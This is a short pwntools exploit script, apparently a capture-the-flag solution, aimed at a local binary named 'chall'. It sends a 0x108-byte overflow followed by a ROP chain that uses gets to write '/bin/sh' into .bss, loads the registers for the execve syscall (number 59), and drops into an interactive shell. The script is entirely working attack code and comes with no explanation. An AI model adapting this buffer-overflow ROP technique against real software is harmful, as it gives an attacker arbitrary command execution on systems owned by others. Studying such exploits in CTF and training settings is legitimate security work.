from pwn import *

elf = ELF('./chall')
p = process('./chall')

rop_rax = 0x400121
rop_rdi = 0x40141c
rop_rsi_r15 = 0x40141a
rop_rdx = 0x4023f5

addr_gets = 0x4004ee
addr_syscall = 0x4024dd
bss = 0x604240

payload = b''
payload += b'A' * 0x100
payload += b'B' * 0x08
payload += p64(rop_rdi)
payload += p64(bss)
payload += p64(addr_gets)
payload += p64(rop_rdi)
payload += p64(bss)
payload += p64(rop_rsi_r15)
payload += p64(0)
payload += p64( 0xcafebabe )
payload += p64( rop_rdx )
payload += p64( 0 )
payload += p64( rop_rax )
payload += p64( 59 )
payload += p64( addr_syscall )

p.sendlineafter( '\n', payload )
p.sendline( "/bin/sh" )
p.interactive()

